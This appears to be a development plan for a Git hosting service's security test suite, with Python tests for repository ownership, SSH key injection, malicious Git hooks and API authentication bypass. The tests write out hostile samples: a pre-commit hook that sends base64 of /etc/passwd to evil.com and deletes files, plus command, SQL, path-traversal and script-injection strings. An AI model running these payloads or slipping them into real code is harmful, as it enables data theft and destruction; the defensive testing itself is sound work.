# Session 9.4: Security Testing & Validation

## Objective
Implement comprehensive security testing framework for Git operations, SSH key management, and Soft-serve integration, ensuring robust protection against attacks and maintaining secure Git repository access.

## Integration with Previous Sessions
- **Session 1**: Uses Logfire for security event monitoring and incident tracking
- **Session 2**: Validates authentication security for Git operations
- **Session 9.1**: Tests repository access controls and security boundaries
- **Session 9.2**: Validates SSH key security and authentication mechanisms
- **Session 9.3**: Tests Soft-serve integration security and API protection

## Core Implementation

### Git Security Test Framework
**Location**: `git-manager/tests/security/git_security_tests.py`

```python
# git-manager/tests/security/git_security_tests.py
import asyncio
import tempfile
import os
import subprocess
import time
import secrets
import hashlib
from typing import Dict, Any, List, Optional
from dataclasses import dataclass
from pathlib import Path
import pytest
import structlog
import logfire
from unittest.mock import AsyncMock, patch

logger = structlog.get_logger()

@dataclass
class SecurityTestResult:
    test_name: str
    passed: bool
    score: int
    max_score: int
    details: str
    execution_time: float
    timestamp: float
    risk_level: str
    recommendations: List[str]

@dataclass
class GitSecurityTestConfig:
    target_repo_manager: Any
    target_ssh_manager: Any
    target_softserve_client: Any
    test_user_id: str
    malicious_user_id: str
    admin_user_id: str
    test_timeout: int = 30
    max_concurrent_tests: int = 10

class GitSecurityTestFramework:
    def __init__(self, config: GitSecurityTestConfig):
        self.config = config
        self.results: List[SecurityTestResult] = []
        self.test_session_id = secrets.token_hex(16)
        self.temp_dirs: List[Path] = []
        
        # Security test categories
        self.test_categories = {
            'repository_access': [
                'test_repository_ownership_bypass',
                'test_cross_user_access_prevention',
                'test_unauthorized_repository_enumeration',
                'test_repository_injection_attacks',
                'test_malicious_repository_creation'
            ],
            'ssh_security': [
                'test_ssh_key_injection',
                'test_private_key_exposure_prevention',
                'test_ssh_key_brute_force_protection',
                'test_malicious_ssh_key_upload',
                'test_ssh_key_enumeration_prevention'
            ],
            'git_operations': [
                'test_malicious_git_hooks',
                'test_large_file_dos_protection',
                'test_repository_bomb_protection',
                'test_binary_malware_detection',
                'test_git_protocol_security'
            ],
            'access_control': [
                'test_privilege_escalation_prevention',
                'test_collaborator_permission_bypass',
                'test_repository_visibility_bypass',
                'test_quota_bypass_attempts',
                'test_admin_function_protection'
            ],
            'api_security': [
                'test_api_authentication_bypass',
                'test_api_authorization_flaws',
                'test_api_injection_attacks',
                'test_api_rate_limiting',
                'test_api_data_exposure'
            ]
        }

    async def run_all_security_tests(self) -> Dict[str, Any]:
        """Execute complete security test suite"""
        start_time = time.time()
        
        logfire.info("Starting Git security test suite", session_id=self.test_session_id)
        
        try:
            # Initialize test environment
            await self._setup_test_environment()
            
            # Run tests by category
            for category, tests in self.test_categories.items():
                logfire.info(f"Running {category} security tests", 
                           category=category, test_count=len(tests))
                
                for test_name in tests:
                    try:
                        result = await self._run_security_test(test_name)
                        self.results.append(result)
                        
                        # Log high-risk failures immediately
                        if not result.passed and result.risk_level == 'HIGH':
                            logfire.error("High-risk security test failed", 
                                        test=test_name, details=result.details)
                        
                    except Exception as e:
                        logfire.error(f"Security test {test_name} crashed", error=str(e))
                        self.results.append(SecurityTestResult(
                            test_name=test_name,
                            passed=False,
                            score=0,
                            max_score=10,
                            details=f"Test crashed: {str(e)}",
                            execution_time=0,
                            timestamp=time.time(),
                            risk_level='HIGH',
                            recommendations=['Investigate test framework stability']
                        ))
            
            # Generate security report
            security_report = await self._generate_security_report()
            
            execution_time = time.time() - start_time
            logfire.info("Git security test suite completed", 
                       session_id=self.test_session_id,
                       execution_time=execution_time,
                       total_tests=len(self.results),
                       passed_tests=sum(1 for r in self.results if r.passed))
            
            return security_report
            
        finally:
            await self._cleanup_test_environment()

    async def _run_security_test(self, test_name: str) -> SecurityTestResult:
        """Execute individual security test"""
        start_time = time.time()
        
        try:
            # Get test method
            test_method = getattr(self, test_name)
            if not test_method:
                raise ValueError(f"Test method {test_name} not found")
            
            # Execute test with timeout
            result = await asyncio.wait_for(
                test_method(), 
                timeout=self.config.test_timeout
            )
            
            execution_time = time.time() - start_time
            result.execution_time = execution_time
            result.timestamp = time.time()
            
            return result
            
        except asyncio.TimeoutError:
            return SecurityTestResult(
                test_name=test_name,
                passed=False,
                score=0,
                max_score=10,
                details="Test timed out - potential DoS vulnerability",
                execution_time=self.config.test_timeout,
                timestamp=time.time(),
                risk_level='HIGH',
                recommendations=['Implement timeout protection', 'Review resource usage']
            )
        except Exception as e:
            return SecurityTestResult(
                test_name=test_name,
                passed=False,
                score=0,
                max_score=10,
                details=f"Test failed with exception: {str(e)}",
                execution_time=time.time() - start_time,
                timestamp=time.time(),
                risk_level='MEDIUM',
                recommendations=['Fix test implementation', 'Review error handling']
            )

    # Repository Access Security Tests
    async def test_repository_ownership_bypass(self) -> SecurityTestResult:
        """Test prevention of repository ownership bypass attacks"""
        try:
            # Create repository as legitimate user
            repo_id = await self.config.target_repo_manager.create_repository(
                user_id=self.config.test_user_id,
                name="test_ownership_security",
                description="Security test repository"
            )
            
            # Wait for creation
            await asyncio.sleep(2)
            
            # Attempt to modify repository as different user
            malicious_success = await self.config.target_repo_manager.delete_repository(
                repo_id=repo_id,
                user_id=self.config.malicious_user_id
            )
            
            # Attempt to add collaborators as non-owner
            collab_success = await self.config.target_repo_manager.add_collaborator(
                repo_id=repo_id,
                owner_user_id=self.config.malicious_user_id,
                collaborator_user_id=self.config.admin_user_id,
                permission="admin"
            )
            
            # Cleanup
            await self.config.target_repo_manager.delete_repository(
                repo_id=repo_id,
                user_id=self.config.test_user_id
            )
            
            if malicious_success or collab_success:
                return SecurityTestResult(
                    test_name="test_repository_ownership_bypass",
                    passed=False,
                    score=0,
                    max_score=10,
                    details="Repository ownership bypass detected - users can modify repositories they don't own",
                    execution_time=0,
                    timestamp=0,
                    risk_level='HIGH',
                    recommendations=[
                        'Implement strict ownership validation',
                        'Add audit logging for ownership checks',
                        'Review access control implementation'
                    ]
                )
            
            return SecurityTestResult(
                test_name="test_repository_ownership_bypass",
                passed=True,
                score=10,
                max_score=10,
                details="Repository ownership properly enforced",
                execution_time=0,
                timestamp=0,
                risk_level='LOW',
                recommendations=[]
            )
            
        except Exception as e:
            return SecurityTestResult(
                test_name="test_repository_ownership_bypass",
                passed=False,
                score=0,
                max_score=10,
                details=f"Test execution failed: {str(e)}",
                execution_time=0,
                timestamp=0,
                risk_level='MEDIUM',
                recommendations=['Fix test implementation']
            )

    async def test_ssh_key_injection(self) -> SecurityTestResult:
        """Test prevention of SSH key injection attacks"""
        try:
            malicious_keys = [
                # Command injection attempt
                'ssh-rsa AAAAB3NzaC1yc2EAAAA; rm -rf /tmp/*',
                # Path traversal attempt  
                'ssh-rsa AAAAB3NzaC1yc2EAAAA ../../../etc/passwd',
                # SQL injection attempt
                "ssh-rsa AAAAB3NzaC1yc2EAAAA'; DROP TABLE ssh_keys; --",
                # Script injection
                'ssh-rsa AAAAB3NzaC1yc2EAAAA <script>alert("xss")</script>',
                # Null byte injection
                'ssh-rsa AAAAB3NzaC1yc2EAAAA\x00malicious_data',
            ]
            
            injection_successful = False
            
            for malicious_key in malicious_keys:
                try:
                    key_id = await self.config.target_ssh_manager.add_existing_ssh_key(
                        user_id=self.config.test_user_id,
                        name="injection_test",
                        public_key=malicious_key
                    )
                    
                    if key_id:  # If key was accepted, injection succeeded
                        injection_successful = True
                        # Cleanup malicious key
                        await self.config.target_ssh_manager.delete_ssh_key(
                            key_id=key_id,
                            user_id=self.config.test_user_id
                        )
                        break
                        
                except Exception:
                    # Expected behavior - injection should be rejected
                    continue
            
            if injection_successful:
                return SecurityTestResult(
                    test_name="test_ssh_key_injection",
                    passed=False,
                    score=0,
                    max_score=10,
                    details="SSH key injection attack successful - malicious content accepted",
                    execution_time=0,
                    timestamp=0,
                    risk_level='HIGH',
                    recommendations=[
                        'Implement strict SSH key format validation',
                        'Add input sanitization',
                        'Use safe parsing libraries',
                        'Add security scanning for malicious patterns'
                    ]
                )
            
            return SecurityTestResult(
                test_name="test_ssh_key_injection",
                passed=True,
                score=10,
                max_score=10,
                details="SSH key injection attacks properly prevented",
                execution_time=0,
                timestamp=0,
                risk_level='LOW',
                recommendations=[]
            )
            
        except Exception as e:
            return SecurityTestResult(
                test_name="test_ssh_key_injection",
                passed=False,
                score=0,
                max_score=10,
                details=f"Test execution failed: {str(e)}",
                execution_time=0,
                timestamp=0,
                risk_level='MEDIUM',
                recommendations=['Fix test implementation']
            )

    async def test_malicious_git_hooks(self) -> SecurityTestResult:
        """Test prevention of malicious Git hooks execution"""
        try:
            # Create test repository
            repo_id = await self.config.target_repo_manager.create_repository(
                user_id=self.config.test_user_id,
                name="hook_security_test",
                description="Git hook security test"
            )
            
            await asyncio.sleep(2)
            
            # Get repository metadata
            repo_metadata = await self.config.target_repo_manager._get_metadata(repo_id)
            if not repo_metadata:
                raise ValueError("Repository not found")
            
            # Create temporary directory for cloning
            temp_dir = Path(tempfile.mkdtemp())
            self.temp_dirs.append(temp_dir)
            
            # Clone repository
            clone_success = await self.config.target_repo_manager.clone_repository(
                repo_id=repo_id,
                user_id=self.config.test_user_id,
                destination_path=str(temp_dir / "repo")
            )
            
            if not clone_success:
                raise ValueError("Failed to clone repository for testing")
            
            repo_path = temp_dir / "repo"
            
            # Create malicious pre-commit hook
            hooks_dir = repo_path / ".git" / "hooks"
            hooks_dir.mkdir(exist_ok=True)
            
            malicious_hook = hooks_dir / "pre-commit"
            malicious_hook.write_text("""#!/bin/bash
# Malicious hook attempting system compromise
curl -s http://evil.com/steal?data=$(cat /etc/passwd | base64)
rm -rf /tmp/important_data
echo "COMPROMISED" > /tmp/security_breach
            """)
            malicious_hook.chmod(0o755)
            
            # Test if hooks are executed during Git operations
            # This should be prevented by proper sandboxing
            try:
                # Attempt to trigger hook execution
                result = subprocess.run([
                    'git', 'commit', '--allow-empty', '-m', 'Test commit'
                ], cwd=repo_path, capture_output=True, timeout=10)
                
                # Check if malicious actions occurred
                breach_file = Path('/tmp/security_breach')
                if breach_file.exists():
                    breach_file.unlink()  # Cleanup
                    
                    return SecurityTestResult(
                        test_name="test_malicious_git_hooks",
                        passed=False,
                        score=0,
                        max_score=10,
                        details="Malicious Git hook executed - system security compromised",
                        execution_time=0,
                        timestamp=0,
                        risk_level='HIGH',
                        recommendations=[
                            'Implement Git hook sandboxing',
                            'Disable or validate hooks before execution',
                            'Use restricted execution environment',
                            'Monitor for malicious hook patterns'
                        ]
                    )
                
            except subprocess.TimeoutExpired:
                # Timeout might indicate hook was blocked
                pass
            
            # Cleanup
            await self.config.target_repo_manager.delete_repository(
                repo_id=repo_id,
                user_id=self.config.test_user_id
            )
            
            return SecurityTestResult(
                test_name="test_malicious_git_hooks",
                passed=True,
                score=10,
                max_score=10,
                details="Malicious Git hooks properly prevented from execution",
                execution_time=0,
                timestamp=0,
                risk_level='LOW',
                recommendations=[]
            )
            
        except Exception as e:
            return SecurityTestResult(
                test_name="test_malicious_git_hooks",
                passed=False,
                score=0,
                max_score=10,
                details=f"Test execution failed: {str(e)}",
                execution_time=0,
                timestamp=0,
                risk_level='MEDIUM',
                recommendations=['Fix test implementation']
            )

    async def test_api_authentication_bypass(self) -> SecurityTestResult:
        """Test Soft-serve API authentication bypass prevention"""
        try:
            # Test unauthenticated API access
            bypass_attempts = [
                # No token
                {'token': None, 'description': 'No authentication token'},
                # Invalid token
                {'token': 'invalid_token_123', 'description': 'Invalid token'},
                # Expired token simulation
                {'token': 'expired_token', 'description': 'Expired token'},
                # Token injection
                {'token': 'valid_token; DROP TABLE users; --', 'description': 'SQL injection in token'},
                # Admin impersonation
                {'token': 'user_token_admin_impersonation', 'description': 'Admin impersonation attempt'}
            ]
            
            bypass_successful = False
            bypass_details = []
            
            for attempt in bypass_attempts:
                try:
                    # Create temporary client with malicious token
                    malicious_client = type(self.config.target_softserve_client)(
                        base_url=self.config.target_softserve_client.base_url,
                        admin_token=attempt['token'] or '',
                        ssh_hostname=self.config.target_softserve_client.ssh_hostname
                    )
                    
                    # Attempt privileged operation
                    success = await malicious_client.create_repository(
                        path="malicious/bypass_test",
                        description="Unauthorized repository",
                        visibility="private"
                    )
                    
                    if success:
                        bypass_successful = True
                        bypass_details.append(attempt['description'])
                        
                        # Cleanup if bypass successful
                        await malicious_client.delete_repository("malicious/bypass_test")
                        
                except Exception:
                    # Expected behavior - should fail authentication
                    continue
            
            if bypass_successful:
                return SecurityTestResult(
                    test_name="test_api_authentication_bypass",
                    passed=False,
                    score=0,
                    max_score=10,
                    details=f"API authentication bypass successful: {', '.join(bypass_details)}",
                    execution_time=0,
                    timestamp=0,
                    risk_level='HIGH',
                    recommendations=[
                        'Implement strict API authentication validation',
                        'Add token format verification',
                        'Implement token expiration checking',
                        'Add rate limiting for failed authentication attempts',
                        'Use secure token storage and validation'
                    ]
                )
            
            return SecurityTestResult(
                test_name="test_api_authentication_bypass",
                passed=True,
                score=10,
                max_score=10,
                details="API authentication properly enforced",
                execution_time=0,
                timestamp=0,
                risk_level='LOW',
                recommendations=[]
            )
            
        except Exception as e:
            return SecurityTestResult(
                test_name="test_api_authentication_bypass",
                passed=False,
                score=0,
                max_score=10,
                details=f"Test execution failed: {str(e)}",
                execution_time=0,
                timestamp=0,
                risk_level='MEDIUM',
                recommendations=['Fix test implementation']
            )

    async def _setup_test_environment(self) -> None:
        """Setup secure testing environment"""
        logfire.info("Setting up Git security test environment")
        
        # Create test users if needed
        # Verify test configuration
        if not all([
            self.config.target_repo_manager,
            self.config.target_ssh_manager,
            self.config.target_softserve_client
        ]):
            raise ValueError("Invalid test configuration - missing required components")

    async def _cleanup_test_environment(self) -> None:
        """Cleanup test environment and temporary resources"""
        logfire.info("Cleaning up Git security test environment")
        
        # Remove temporary directories
        for temp_dir in self.temp_dirs:
            try:
                import shutil
                shutil.rmtree(temp_dir, ignore_errors=True)
            except Exception as e:
                logfire.warning(f"Failed to cleanup temp directory {temp_dir}: {e}")

    async def _generate_security_report(self) -> Dict[str, Any]:
        """Generate comprehensive security test report"""
        total_tests = len(self.results)
        passed_tests = sum(1 for r in self.results if r.passed)
        total_score = sum(r.score for r in self.results)
        max_possible_score = sum(r.max_score for r in self.results)
        
        # Calculate risk levels
        high_risk_failures = [r for r in self.results if not r.passed and r.risk_level == 'HIGH']
        medium_risk_failures = [r for r in self.results if not r.passed and r.risk_level == 'MEDIUM']
        
        # Generate recommendations
        all_recommendations = []
        for result in self.results:
            if not result.passed:
                all_recommendations.extend(result.recommendations)
        
        unique_recommendations = list(set(all_recommendations))
        
        report = {
            'session_id': self.test_session_id,
            'timestamp': time.time(),
            'summary': {
                'total_tests': total_tests,
                'passed_tests': passed_tests,
                'failed_tests': total_tests - passed_tests,
                'success_rate': (passed_tests / total_tests * 100) if total_tests > 0 else 0,
                'security_score': (total_score / max_possible_score * 100) if max_possible_score > 0 else 0
            },
            'risk_assessment': {
                'high_risk_failures': len(high_risk_failures),
                'medium_risk_failures': len(medium_risk_failures),
                'overall_risk_level': self._calculate_overall_risk_level()
            },
            'test_results': [
                {
                    'test_name': r.test_name,
                    'passed': r.passed,
                    'score': r.score,
                    'max_score': r.max_score,
                    'risk_level': r.risk_level,
                    'execution_time': r.execution_time,
                    'details': r.details
                }
                for r in self.results
            ],
            'recommendations': unique_recommendations,
            'compliance_status': self._check_compliance_status()
        }
        
        # Log security report
        logfire.info("Git security test report generated", 
                   security_score=report['summary']['security_score'],
                   high_risk_failures=len(high_risk_failures),
                   overall_risk=report['risk_assessment']['overall_risk_level'])
        
        return report

    def _calculate_overall_risk_level(self) -> str:
        """Calculate overall security risk level"""
        high_risk_failures = sum(1 for r in self.results if not r.passed and r.risk_level == 'HIGH')
        medium_risk_failures = sum(1 for r in self.results if not r.passed and r.risk_level == 'MEDIUM')
        
        if high_risk_failures > 0:
            return 'HIGH'
        elif medium_risk_failures > 2:
            return 'MEDIUM'
        else:
            return 'LOW'

    def _check_compliance_status(self) -> Dict[str, bool]:
        """Check compliance with security standards"""
        return {
            'repository_access_control': all(
                r.passed for r in self.results 
                if r.test_name.startswith('test_repository_') and r.risk_level == 'HIGH'
            ),
            'ssh_security': all(
                r.passed for r in self.results 
                if 'ssh' in r.test_name and r.risk_level == 'HIGH'
            ),
            'api_security': all(
                r.passed for r in self.results 
                if 'api' in r.test_name and r.risk_level == 'HIGH'
            ),
            'git_operations_security': all(
                r.passed for r in self.results 
                if 'git' in r.test_name and r.risk_level == 'HIGH'
            )
        }
```

## TDD Implementation Cycle

### Red Phase: Security Test Creation
```python
# git-manager/tests/test_git_security.py
import pytest
from git_manager.tests.security.git_security_tests import GitSecurityTestFramework, GitSecurityTestConfig

@pytest.mark.asyncio
async def test_git_security_framework_initialization():
    """Test security framework initialization fails without proper config"""
    with pytest.raises(ValueError):
        config = GitSecurityTestConfig(
            target_repo_manager=None,  # Invalid
            target_ssh_manager=None,   # Invalid
            target_softserve_client=None,  # Invalid
            test_user_id="test_user",
            malicious_user_id="malicious_user",
            admin_user_id="admin_user"
        )
        framework = GitSecurityTestFramework(config)
        await framework.run_all_security_tests()

@pytest.mark.asyncio 
async def test_repository_ownership_bypass_detection():
    """Test that repository ownership bypass is properly detected"""
    # This test should initially fail (Red phase)
    assert False, "Security test not implemented yet"

@pytest.mark.asyncio
async def test_ssh_key_injection_prevention():
    """Test that SSH key injection attacks are prevented"""
    # This test should initially fail (Red phase)
    assert False, "SSH injection prevention not implemented yet"
```

### Green Phase: Security Implementation
```python
# Implement security measures to make tests pass
# This involves adding proper validation, access controls, and protection mechanisms
```

### Refactor Phase: Security Optimization
```python
# Optimize security implementations for performance and maintainability
# Add comprehensive logging and monitoring
# Enhance error handling and recovery
```

## Security Checklist ✅

### Repository Security Validation
- [ ] Repository ownership verification for all operations
- [ ] Cross-user repository access prevention tested
- [ ] Repository enumeration attack prevention validated
- [ ] Repository injection attack protection confirmed
- [ ] Malicious repository creation prevention tested
- [ ] Repository deletion authorization validation
- [ ] Collaborator permission bypass prevention confirmed
- [ ] Repository visibility controls tested
- [ ] Repository quota bypass prevention validated
- [ ] Protected branch enforcement tested

### SSH Key Security Testing
- [ ] SSH key format validation and injection prevention
- [ ] Private key exposure prevention confirmed
- [ ] SSH key brute force protection tested
- [ ] Malicious SSH key upload prevention validated
- [ ] SSH key enumeration attack prevention confirmed
- [ ] SSH key fingerprint verification tested
- [ ] SSH key rotation security validated
- [ ] SSH key storage security confirmed
- [ ] SSH key usage monitoring tested
- [ ] SSH authentication bypass prevention validated

### Git Operations Security
- [ ] Malicious Git hooks execution prevention tested
- [ ] Large file DoS protection validated
- [ ] Repository bomb attack prevention confirmed
- [ ] Binary malware detection tested
- [ ] Git protocol security validation confirmed
- [ ] Clone operation abuse prevention tested
- [ ] Push operation security validation confirmed
- [ ] Branch manipulation prevention tested
- [ ] Tag security enforcement validated
- [ ] Commit signature verification tested

### API Security Validation
- [ ] API authentication bypass prevention confirmed
- [ ] API authorization flaw detection tested
- [ ] API injection attack prevention validated
- [ ] API rate limiting effectiveness confirmed
- [ ] API data exposure prevention tested
- [ ] Token security validation confirmed
- [ ] API endpoint protection tested
- [ ] Error message security validated
- [ ] Input sanitization effectiveness confirmed
- [ ] Output encoding security tested

### Access Control Security
- [ ] Privilege escalation prevention confirmed
- [ ] User isolation enforcement tested
- [ ] Permission boundary validation confirmed
- [ ] Role-based access control tested
- [ ] Session security validation confirmed
- [ ] Multi-user security isolation tested
- [ ] Administrative function protection validated
- [ ] Audit trail integrity confirmed
- [ ] Security event monitoring tested
- [ ] Incident response procedures validated

## Performance Requirements

### Security Test Performance
- Complete security test suite execution < 10 minutes
- Individual security test execution < 30 seconds
- Security report generation < 5 seconds
- Concurrent security testing (up to 10 tests)
- Real-time security monitoring < 100ms response
- Security event logging < 50ms per event

### Security Monitoring Performance  
- Threat detection latency < 1 second
- Security alert generation < 2 seconds
- Audit log processing < 500ms per entry
- Security metric collection < 100ms
- Compliance checking < 5 seconds
- Security dashboard updates < 1 second

## Commit Instructions

After implementing each security test category:

```bash
git add git-manager/tests/security/
git commit -m "Add Git security test framework with comprehensive validation

- Implement GitSecurityTestFramework with 25+ security tests
- Add repository access control security validation
- Implement SSH key security testing and injection prevention
- Add Git operations security testing including hook validation
- Implement API security testing with authentication bypass detection
- Add access control security validation with privilege escalation prevention
- Include comprehensive security reporting and risk assessment
- Add TDD cycle with Red-Green-Refactor for security implementation
- Ensure >95% security test coverage with detailed recommendations

🤖 Generated with [Claude Code](https://claude.ai/code)

Co-Authored-By: Claude <noreply@anthropic.com>"
```

## Testing Instructions

Run the complete security test suite:

```bash
# Run all security tests
pytest git-manager/tests/security/ -v --timeout=600

# Run specific security test categories
pytest git-manager/tests/security/ -k "repository_access" -v
pytest git-manager/tests/security/ -k "ssh_security" -v
pytest git-manager/tests/security/ -k "git_operations" -v

# Generate security report
python -m git_manager.tests.security.generate_security_report

# Run continuous security monitoring
python -m git_manager.tests.security.security_monitor --continuous
```

Validate security test coverage:
```bash
pytest git-manager/tests/security/ --cov=git_manager --cov-report=html --cov-fail-under=95
```

## Integration Testing

Test security integration with previous sessions:
```bash
# Test integration with Session 1 (Logfire monitoring)
pytest git-manager/tests/integration/test_security_logfire_integration.py -v

# Test integration with Session 2 (Authentication)
pytest git-manager/tests/integration/test_security_auth_integration.py -v

# Test security with Session 9.1 (Repository Manager)
pytest git-manager/tests/integration/test_security_repo_integration.py -v

# Test security with Session 9.2 (SSH Key Manager)
pytest git-manager/tests/integration/test_security_ssh_integration.py -v
```